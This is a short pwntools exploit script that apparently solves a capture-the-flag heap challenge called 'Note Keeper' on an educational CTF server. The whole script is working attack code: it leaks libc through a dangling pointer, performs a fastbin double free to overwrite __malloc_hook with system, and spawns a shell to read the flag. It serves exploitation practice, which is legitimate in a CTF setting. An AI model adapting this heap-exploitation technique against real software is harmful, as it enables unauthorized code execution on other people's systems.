'/ Note Keeper with malloc() & free() /'
from pwn import *
context(arch = 'amd64', os = 'linux')
r = remote('edu-ctf.csie.org', 10178)
#r = process('./note')
def add( size, word ):
	r.sendafter('> ','1')
	r.sendafter('Size: ', str(size))
	r.sendafter('Note: ', word)
def show( index ):
	r.sendafter('> ','2')
	r.sendafter('Index: ', str(index))
def delete( index ):
	r.sendafter('> ','3')
	r.sendafter('Index: ', str(index))

add( 0x100, ' ' )	# 0
add( 0x60, ' ' ) 	# 1
add( 0x60, ' ' ) 	# 2
delete( 0 )
show( 0 )		# daggling pointer
r.recvline()
libc_base = u64( r.recv(6) + b'\0\0' ) - 0x3c4b78
malloc_hook = libc_base + 0x3c4b10
system_func = libc_base + 0x45390
bin_sh_ptr = libc_base + 0x18cd57
success( "libc_base = " + hex(libc_base) )

delete( 1 )
delete( 2 )
delete( 1 )		# fastbin[0x70]->1->2->1
add( 0x60, p64(malloc_hook -0x10 -3) )
add( 0x60, ' ' )
add( 0x60, ' ' )

add( 0x60, b'\x7F\x00\x00' + p64(system_func) )
r.sendafter('> ','1')
r.sendafter('Size: ', str(bin_sh_ptr))

r.sendline('cat /home/`whoami`/flag')
r.interactive()
